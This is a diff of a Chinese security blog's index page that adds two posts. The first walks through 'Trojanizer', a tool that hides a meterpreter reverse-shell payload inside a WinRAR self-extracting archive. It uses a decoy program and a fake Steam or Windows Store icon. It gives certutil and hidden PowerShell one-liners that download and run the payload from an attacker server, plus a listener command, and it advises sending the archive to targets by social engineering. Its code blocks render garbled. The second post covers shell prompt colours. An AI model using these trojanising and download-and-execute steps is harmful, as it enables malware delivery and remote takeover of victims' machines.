@@ -195,7 +195,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/C-primer/" style="font-size: 15.71px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 17.14px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.43px;">基础</a> <a href="/tags/存档/" style="font-size: 11.43px;">存档</a> <a href="/tags/工具/" style="font-size: 18.57px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 14.29px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 12.86px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 14.29px;">笔记</a> <a href="/tags/笔记-bak/" style="font-size: 10px;">笔记_bak</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.43px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
+                        <a href="/tags/C-primer/" style="font-size: 16.25px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 18.75px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.25px;">基础</a> <a href="/tags/存档/" style="font-size: 11.25px;">存档</a> <a href="/tags/工具/" style="font-size: 17.5px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 12.5px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 13.75px;">笔记</a> <a href="/tags/笔记-bak/" style="font-size: 10px;">笔记_bak</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.25px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
                     </div>
                 </section>
                 
@@ -281,6 +281,195 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-Trojanizer-Trojanize-Your-Payload" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/02/23/Trojanizer-Trojanize-Your-Payload/" class="article-date">
+      <time datetime="2018-02-23T12:03:27.000Z" itemprop="datePublished">2018-02-23</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/02/23/Trojanizer-Trojanize-Your-Payload/">Trojanizer-Trojanize Your Payload</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>Trojanizer - 在你的有效载荷中植入后门（WinRAR [SFX]自动化）</p>
+<p>Trojanizer工具使用WinRAR（SFX自解压文件）将用户输入的两个文件压缩并转换为SFX可执行文件（.exe）保存。sfx文件在执行时会同时运行两个文件（我们的有效载荷和应用程序在同时运行）。</p>
+<p>为了减少文件在执行时被发现的可疑性，trojanizer会尝试用用户选择的图标替换sfx文件的默认图标（.ico），并且压缩所有的SFX存档沙盒信息（Silent = 1 | Overwrite = 1 ）。</p>
+<p>Trojanizer不会构建木马，但从目标的角度来看，它会模仿木马的行为（在后台执行有效负载，而合法应用程序在前台执行）。</p>
+<h5 id="依赖（后端应用程序）"><a href="#依赖（后端应用程序）" class="headerlink" title="依赖（后端应用程序）"></a>依赖（后端应用程序）</h5><p>Zenity（bash-GUI）| Wine（x86 | x64）| WinRAr.exe（已安装在wine中）<br>“Trojanizer.sh会根据需要下载/安装所有依赖关系</p>
+<p>在第一次尝试运行该工具之前，建议在配置文件中编辑配置选项：SYSTEM_ARCH = [your_sys_arch]</p>
+<h5 id="被允许的有效载荷"><a href="#被允许的有效载荷" class="headerlink" title="被允许的有效载荷"></a>被允许的有效载荷</h5><p>.exe | .bat | .vbs | .ps1<br>“windows / SFX可以自动提取并执行所有的有效载荷”</p>
+<p>提示：如果在配置文件中选择’SINGLE_EXEC = ON’，那么trojanizer将接受输入的任何类型的扩展。</p>
+<h5 id="接受的合法的文件（诱饵）"><a href="#接受的合法的文件（诱饵）" class="headerlink" title="接受的合法的文件（诱饵）"></a>接受的合法的文件（诱饵）</h5><p>.exe | .bat | .vbs | .ps1 | .jpg | .bmp | .doc | .ppt | .ppt | 等等。<br>“windows / SFX可以自动提取并执行的所有应用程序”</p>
+<h5 id="更多设置"><a href="#更多设置" class="headerlink" title="更多设置"></a>更多设置</h5><p>Trojanizer高级选项只能在配置文件中访问且只能在运行主工具Trojanizer.sh之前对它们进行配置。</p>
+<ul>
+<li>预设高级选项<br>在提取/执行两个压缩文件（SFX文件）之前，Trojanizer可以被配置为执行命令和应用。这允许用户在实际中在目标系统提取文件之前利用预先安装的软件执行远程命令。如果激活，trojanizer会在（zenity沙箱）执行命令 </li>
+</ul>
+<ul>
+<li>单可执行文件<br>让我们看看下面的场景：你有一个DLL负载输入，你需要提取时执行，但sfx文件不能直接执行dll文件，这个设置允许用户输入一个批处理脚本（.bat），它将成为用于执行dll负载。Trojanizer需要做的就是指示SFX归档文件解压缩这两个文件，然后执行script.bat </li>
+</ul>
+<p>此模式将其默认行为切换为压缩用户输入的两个文件，但仅在提取时执行其中的一个文件（输入的2º文件将被执行）…</p>
+<h5 id="TROJANIZER和应用白名单绕过"><a href="#TROJANIZER和应用白名单绕过" class="headerlink" title="TROJANIZER和应用白名单绕过"></a>TROJANIZER和应用白名单绕过</h5><p>许多人已经完成了许多令人敬畏的工作，特别是@subTee，我们在这里最终想要的是关于应用程序的白名单绕过：执行任意代码滥用Microsoft内置二进制文件。<a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank" rel="noopener"> Windows 在线下载远程负载并执行任意代码</a></p>
+<p>以下练习描述了如何使用trojanizer’单文件模式’和’Presetup’高级开关来删除（远程下载）并使用’certutil’或’powershell’一句话木马绕过白名单 </p>
+<ol>
+<li><p>使用metasploit来构建我们的有效载荷</p>
+<figure class="highlight plain"><figcaption><span>-p windows/meterpreter/reverse_tcp LHOST</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 将payload.exe复制到apache2 webroot并启动服务</span><br><span class="line"></span><br><span class="line">    ```cp payload.exe /var/www/html/payload.exe</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><figcaption><span>apache2 start```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 编辑Trojanizer&apos;设置&apos;文件并激活：</span><br><span class="line">    ```PRE_SETUP=ON</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. 运行trojanizer工具</span><br><span class="line">    ```PAYLOAD TO BE COMPRESSED =&gt; /screenshot.png (it will not matter what you compress)</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><figcaption><span>THIS FILE UPON EXTRACTION </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```PRESETUP SANDBOX =&gt; cmd.exe /c certutil -urlcache -split -f &apos;http://192.168.1.69/payload.exe&apos;, &apos;%TEMP%\\payload.exe&apos;; Start-Process &apos;%TEMP%\\payload.exe&apos;</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><figcaption><span>FILENAME </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```REPLACE ICON =&gt; Windows-Store.ico OR Steam-logo.ico</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开始监听，并使用社交工具将sfx存档发送到目标</p>
+ <figure class="highlight plain"><figcaption><span>-x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.69; set lport 666; exploit'```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">当自解压文件执行时，它会从我们的Apache2 web服务器下载payload.exe并提取“screenshot.png”和“AngryBirds.exe”（最后一个将作为诱饵被执行）之前执行它</span><br><span class="line"></span><br><span class="line">的跟随oneliner用途&apos;powershell（下载文件+启动）&apos;方法实现与以前的&apos;certutil&apos;相同的练习。</span><br><span class="line">    ```cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile(&apos;http://192.168.1.69/payload.exe&apos;, &apos;%TEMP%\\payload.exe&apos;) &amp; start &apos;%TEMP%\\payload.exe&apos;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>后续的oneliner使用’powershell（IEX +下载字符串）’方法来实现几乎相同（payload.ps1不接触磁盘）<br>    <figure class="highlight plain"><figcaption><span>/c powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.69/payload.ps1'))" ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 下载/安装 #####</span><br><span class="line">1. Download framework from github</span><br><span class="line">    ``` git clone https://github.com/r00t-3xp10it/trojanizer.git```    </span><br><span class="line"></span><br><span class="line">2. Set files execution permitions</span><br><span class="line">     ```cd trojanizer</span><br></pre></td></tr></table></figure></p>
+<pre><code><figure class="highlight plain"><figcaption><span>chmod +x *.sh```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. config framework</span><br><span class="line">     ```nano settings</span><br></pre></td></tr></table></figure>
+</code></pre><ol>
+<li>Run main tool<br><code>sudo ./Trojanizer.sh</code></li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-定制自己的shell提示符" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/02/12/定制自己的shell提示符/" class="article-date">
+      <time datetime="2018-02-12T13:01:00.000Z" itemprop="datePublished">2018-02-12</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/02/12/定制自己的shell提示符/">定制自己的shell提示符</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>虽然parrot的shell提示符已经是很骚气了。但是作为喜欢折腾，没有麻烦制造麻烦也要上的我还是决定搞一下事情。</p>
+<h5 id="shell提示符的变量"><a href="#shell提示符的变量" class="headerlink" title="shell提示符的变量"></a>shell提示符的变量</h5><p> 提示符是由 <code>PS1</code>这个环境变量进行定义。我们可以使用<code>echo $PS1</code>命令来打印我们现在的shell命令提示符号的代码。</p>
+<p> 简单解释一些变量的含义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> \a 	以 ASCII 格式编码的铃声 . 当遇到这个转义序列时，计算机会发出提示声。</span><br><span class="line">\d 	以日，月，天格式来表示当前日期。例如，“Mon May 26.”</span><br><span class="line">\h 	本地机的主机名，但不带末尾的域名。</span><br><span class="line">\H 	完整的主机名。</span><br><span class="line">\j 	运行在当前 shell 会话中的工作数。</span><br><span class="line">\l 	当前终端设备名。</span><br><span class="line">\n 	一个换行符。</span><br><span class="line">\r 	一个回车符。</span><br><span class="line">\s 	shell 程序名。</span><br><span class="line">\t 	以24小时制，hours:minutes:seconds 的格式表示当前时间.</span><br><span class="line">\T 	以12小时制表示当前时间。</span><br><span class="line">\@ 	以12小时制，AM/PM 格式来表示当前时间。</span><br><span class="line">\A 	以24小时制，hours:minutes 格式表示当前时间。</span><br><span class="line">\u 	当前用户名。</span><br><span class="line">\v 	shell 程序的版本号。</span><br><span class="line">\V 	Version and release numbers of the shell.</span><br><span class="line">\w 	当前工作目录名。</span><br><span class="line">\W 	当前工作目录名的最后部分。</span><br><span class="line">\! 	当前命令的历史号。</span><br><span class="line">\# 	当前 shell 会话中的命令数。</span><br><span class="line">\$ 	这会显示一个&quot;$&quot;字符，除非你拥有超级用户权限。在那种情况下， 它会显示一个&quot;#&quot;字符。</span><br><span class="line">\[ 	标志着一系列一个或多个非打印字符的开始。这被用来嵌入非打印 的控制字符，这些字符以某种方式来操作终端仿真器，比方说移动光标或者是更改文本颜色。</span><br><span class="line">\] 	标志着非打印字符序列结束。</span><br><span class="line"></span><br><span class="line">文本颜色</span><br><span class="line">\033[0;30m 	黑色 	</span><br><span class="line">\033[1;30m 	深灰色</span><br><span class="line">\033[0;31m 	红色</span><br><span class="line">\033[1;31m 	浅红色</span><br><span class="line">\033[0;32m 	绿色 	</span><br><span class="line">\033[1;32m 	浅绿色</span><br><span class="line">\033[0;33m 	棕色 	</span><br><span class="line">\033[1;33m 	黄色</span><br><span class="line">\033[0;34m 	蓝色 	</span><br><span class="line">\033[1;34m 	浅蓝色</span><br><span class="line">\033[0;35m 	粉红 	</span><br><span class="line">\033[1;35m 	浅粉色</span><br><span class="line">\033[0;36m 	青色 	</span><br><span class="line">\033[1;36m 	浅青色</span><br><span class="line">\033[0;37m 	浅灰色 	</span><br><span class="line">\033[1;37m 	白色</span><br><span class="line"></span><br><span class="line">背景颜色</span><br><span class="line">\033[0;40m     蓝色</span><br><span class="line"> \033[1;44m    黑色</span><br><span class="line">\033[0;41m    红色</span><br><span class="line"> \033[1;45m   粉红</span><br><span class="line">\033[0;42m    绿色</span><br><span class="line"> \033[1;46m   青色</span><br><span class="line">\033[0;43m    棕色</span><br><span class="line"> \033[1;47m   浅灰色</span><br></pre></td></tr></table></figure></p>
+<p>一般上面那一段是太长不看系列的东西，但是好像可以总结成一个公式<code>\[\e[F;Bm\]</code>其中“F”为字体颜色，编号30~37；“B”为背景色，编号40~47。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   前景     背景     颜色</span><br><span class="line">　　30      40      黑色</span><br><span class="line">　　31      41      红色</span><br><span class="line">　　32      42      绿色</span><br><span class="line">　　33      43      黄色</span><br><span class="line">　　34      44      蓝色</span><br><span class="line">　　35      45      紫红色</span><br><span class="line">　　36      46      青蓝色</span><br><span class="line">　　37      47      白色</span><br><span class="line"></span><br><span class="line">代码      意义</span><br><span class="line">0            OFF</span><br><span class="line">1            高亮显示</span><br><span class="line">4            underline            </span><br><span class="line">7            反白显示</span><br><span class="line">8            不可见</span><br></pre></td></tr></table></figure>
+<p>关于光标的行为常用的为以下几种，大家可以看看有什么可以用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">\033[l;cH       把光标移到第 l 行，第 c 列。</span><br><span class="line"></span><br><span class="line">\033[nA         把光标向上移动 n 行。</span><br><span class="line"></span><br><span class="line">\033[nB         把光标向下移动 n 行。</span><br><span class="line"></span><br><span class="line">\033[nC         把光标向前移动 n 个字符。</span><br><span class="line"></span><br><span class="line">\033[nD         把光标向后移动 n 个字符。</span><br><span class="line"></span><br><span class="line">\033[2J         清空屏幕，把光标移到左上角（第零行，第零列）。</span><br><span class="line"></span><br><span class="line">\033[K          清空从光标位置到当前行末的内容。</span><br><span class="line"></span><br><span class="line">\033[s          存储当前光标位置。</span><br><span class="line"></span><br><span class="line">\033[u          唤醒之前存储的光标位置。</span><br></pre></td></tr></table></figure>
+<h6 id="开始我们的定制"><a href="#开始我们的定制" class="headerlink" title="开始我们的定制"></a>开始我们的定制</h6><p>   首先，我们备份当前的环境变量</p>
+<pre><code>ps1Old=&quot;$PS1&quot;
+</code></pre><p>然后，我们需要验证一下我们真的成功备份了这个变量</p>
+<pre><code>echo $ps1Old
+</code></pre><p>然后修改当前的变量</p>
+<p>[\033[0;31m]][\033[01;33m][\033[01;96m][\033[0;31m]]\342\224\200[[\033[0;32m]\t<br>[\033[01;96m][\033[0;31m]]\342\224\200[[\033[0;32m]      表示 红色的]-[</p>
+<p>解释一下暂时我知道的shell默认的配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\[\033[0;31m\]\342\224\214\342\224\200$([[ $? != 0 ]] &amp;&amp; echo &quot;[\[\033[0;31m\]\342\234\227\[\033[0;37m\]]\342\224\200&quot;)[\[\033[0;39m\]\u\[\033[01;33m\]@\[\033[01;96m\]\h\[\033[0;31m\]]\342\224\200[\[\033[0;32m\]\w\[\033[0;31m\]]\n\[\033[0;31m\]\342\224\224\342\224\200\342\224\200\342\225\274 \[\033[0m\]\[\e[01;33m\]\$\[\e[0m\]</span><br></pre></td></tr></table></figure></p>
+<p><code>\[\033[0;31m</code> 表示红色`</p>
+<p><code>\]\342\224\214\342\224\200</code> 貌似是八进制转移字符，这个暂时还没查到，欢迎诸位大佬进行补充。</p>
+<p><code>[\[\033[0;39m\]\u</code>以绿色打印当前用户名</p>
+<p><code>\[\033[01;33m\]@</code>用黄色打印@字符</p>
+<p><code>\[\033[01;96m\]\h</code> 打印主机名</p>
+<p><code>\[\033[0;31m\]]\342\224\200[\[\</code>打印红色的“]-[“符号</p>
+<p><code>033[0;32m\]\w</code>打印绿色的当前目录</p>
+<p><code>\[\033[0;31m\]]\n</code>换行符<br><code>\[\e[01;33m\]\$</code>打印$符号<br><code>\[\e[0m\]</code>清除当前的提示符设置，以系统默认的方法来进行输出</p>
+<p>然后大家就可以参照上面的解释来定制自己的shell提示符。，以下为我自己的提示命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\[\033[1;33m\]\342\224\214\342\224\200$([[ $? != 0 ]] &amp;&amp; echo &quot;[\[\033[0;33m\]\342\234\227\[\033[0;37m\]]\342\224\200&quot;)[\[\033[0;39m\]\u\[\033[01;33m\]@\[\033[01;96m\]\h\[\033[0;33m\]]\342\224\200[\[\033[1;34m\]\w\[\033[01;96m\]\[\033[0;33m\]]\342\224\200[\[\033[1;31m\]\t\[\033[01;96m\]\[\033[1;33m\]]\n\[\033[0;33m\]\342\224\224\342\224\200\342\224\200\342\225\274 \[\033[0m\]\[\e[01;33m\]\$\[\e[0m\]</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/LINUX/">LINUX</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/个人定制/">个人定制</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
   
     <article id="post-交换机的工作原理" class="article article-type-post" itemscope itemprop="blogPost">
   
